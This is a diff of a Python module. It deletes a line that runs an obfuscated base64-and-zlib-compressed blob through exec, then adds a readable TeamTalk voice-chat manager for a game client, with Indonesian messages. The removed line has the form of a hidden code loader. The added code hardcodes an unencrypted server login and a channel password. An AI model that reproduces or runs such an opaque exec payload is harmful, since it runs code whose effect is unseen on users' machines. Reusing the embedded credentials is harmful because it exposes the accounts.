@@ -1,2 +1,340 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'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')))
+import threading
+
+import asyncio
+
+import sys
+
+import os
+import sys
+
+import traceback
+
+import platform
+
+
+
+if platform.system() == 'Windows':
+    if getattr(sys, 'frozen', False):
+        try:
+            os.add_dll_directory(os.path.join(os.path.dirname(sys.executable), 'dll'))
+        except FileNotFoundError:
+            pass
+    else:
+        try:
+            os.add_dll_directory(os.path.join(sys._MEIPASS if getattr(sys, 'frozen', False) else os.getcwd(), 'dll'))
+        except FileNotFoundError:
+            pass
+
+
+
+try:
+    import pytalk
+    HAS_PYTALK = True
+except Exception as e:
+    HAS_PYTALK = False
+    PYTALK_ERROR = str(e)
+
+
+
+class TeamTalkManager:
+
+    def __init__(self, manager):
+
+        self.manager = manager
+
+        self.bot = None
+
+        self.tt_instance = None
+
+        self.mic_active = False
+
+        self.connected = False
+
+        self._thread = None
+
+        self._loop = None
+
+        self.is_running = False
+
+
+
+    def start(self, nickname="Player"):
+
+        if not HAS_PYTALK:
+            self.manager.tts.speak(f"Modul pytalk gagal dimuat: {PYTALK_ERROR}")
+            return
+
+
+
+        if self.is_running:
+
+            return
+
+            
+
+        self.manager.tts.speak("Menghubungkan ke Voice Chat TeamTalk...")
+
+
+
+        self.is_running = True
+
+        self._thread = threading.Thread(target=self._run_async_loop, args=(nickname,), daemon=True)
+
+        self._thread.start()
+
+
+
+    def _run_async_loop(self, nickname):
+
+        self._loop = asyncio.new_event_loop()
+
+        asyncio.set_event_loop(self._loop)
+
+        
+
+        self.bot = pytalk.TeamTalkBot(client_name="GutsyDawn Voice")
+
+        
+
+        @self.bot.event
+
+        async def on_my_login(server):
+
+            await asyncio.sleep(2)
+
+            self.tt_instance = server.teamtalk_instance
+
+            tt = self.tt_instance
+
+            
+
+            try:
+
+                tt.set_input_device("default")
+
+                devices = tt.get_sound_devices()
+                import wx
+                wx.CallAfter(self.manager.update_audio_devices, devices)
+
+                default_out = -1
+
+                if len(devices) > 0:
+
+                    default_out = devices[0].id
+
+                    for d in devices:
+
+                        if 'Output' in str(d):
+
+                            default_out = d.id
+
+                            break
+
+                
+
+                tt.super.initSoundOutputDevice(default_out)
+                self.set_voice_volume(int(getattr(self.manager.player, 'voice_volume', 1.0) * 100))
+
+                tt.enable_voice_transmission(self.mic_active)
+
+                
+
+                channel_password = "cliend10104040101010404040"
+
+                joined = False
+
+                
+
+                try:
+
+                    # Bergabung langsung ke Channel ID 8 sesuai instruksi user
+
+                    target_ch_id = 8
+
+                    tt.join_channel_by_id(target_ch_id, channel_password)
+
+                    joined = True
+
+                    
+
+                except Exception as e:
+
+                    import logging
+
+                    logging.error(f"Gagal join channel ID 8: {e}")
+
+                
+
+                self.connected = joined
+                # Dihilangkan speak keberhasilan join untuk menghindari "voice chat konengtit"
+                if joined:
+                    import wx
+                    wx.CallAfter(self.manager.audio.play, "welcome.ogg")
+                    wx.CallAfter(self.manager.tts.speak, f"Selamat datang kembali, {self.manager.player.username}!")
+
+            except Exception as e:
+
+                pass
+
+
+
+        @self.bot.event
+
+        async def on_ready():
+
+            server_info = pytalk.TeamTalkServerInfo(
+
+                host="tt5.angelsclan.net",
+
+                tcp_port=63217,
+
+                udp_port=63217,
+
+                username="GutsyDawn_Cliend",
+
+                password="GutsyDawn_Cliend6969",
+
+                encrypted=False,
+
+                nickname=nickname
+
+            )
+
+            await self.bot.add_server(server_info)
+
+            
+
+        @self.bot.event
+
+        async def on_message(message):
+
+            try:
+
+                msg_type = "UNKNOWN"
+
+                if "BroadcastMessage" in str(type(message)):
+
+                    msg_type = "BROADCAST"
+
+                elif "ChannelMessage" in str(type(message)):
+
+                    msg_type = "CHANNEL"
+
+                elif "UserMessage" in str(type(message)):
+
+                    msg_type = "USER"
+
+                    
+
+                if msg_type in ["BROADCAST", "CHANNEL", "USER"]:
+
+                    sender_name = message.user.nickname if message.user else "System"
+
+                    content = message.content
+
+                    import wx
+
+                    # Putar notifikasi suara lokal dan tts
+
+                    wx.CallAfter(self.manager.audio.play, "pesan_lokal.ogg")
+
+                    wx.CallAfter(self.manager.tts.speak, f"[TT {msg_type}] {sender_name}: {content}")
+
+            except:
+
+                pass
+
+
+
+        async def main_task():
+
+            import logging
+
+            logging.info("Starting TeamTalk bot connection...")
+
+            try:
+
+                async with self.bot:
+
+                    await self.bot._start()
+
+            except Exception as e:
+
+                import traceback
+
+                logging.error("Inner Exception: " + traceback.format_exc())
+
+                
+
+        try:
+            self._loop.run_until_complete(main_task())
+        except RuntimeError as e:
+            if "Event loop stopped" in str(e):
+                pass
+            else:
+                import logging, traceback
+                logging.error("FATAL TEAMTALK ERROR: " + traceback.format_exc())
+        except Exception as e:
+            import logging, traceback
+            logging.error("FATAL TEAMTALK ERROR: " + traceback.format_exc())
+
+
+
+    def toggle_mic(self):
+
+        self.mic_active = not self.mic_active
+
+        if self.tt_instance:
+
+            try:
+
+                self.tt_instance.enable_voice_transmission(self.mic_active)
+
+                status = "Mic aktif" if self.mic_active else "Mic mati"
+
+                self.manager.tts.speak(status)
+
+            except:
+
+                pass
+
+
+
+    def set_voice_volume(self, percentage: int):
+        if self.tt_instance:
+            try:
+                from pytalk._utils import percent_to_ref_volume
+                from pytalk.implementation.TeamTalkPy import TeamTalk5 as sdk
+                internal_vol = percent_to_ref_volume(float(percentage))
+                sdk._SetSoundOutputVolume(self.tt_instance._tt, internal_vol)
+            except Exception:
+                pass
+
+    def stop(self):
+        if self.is_running:
+            self.is_running = False
+            try:
+                if getattr(self, 'tt_instance', None):
+                    self.tt_instance.disconnect()
+            except:
+                pass
+            if self._loop:
+                self._loop.call_soon_threadsafe(self._loop.stop)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
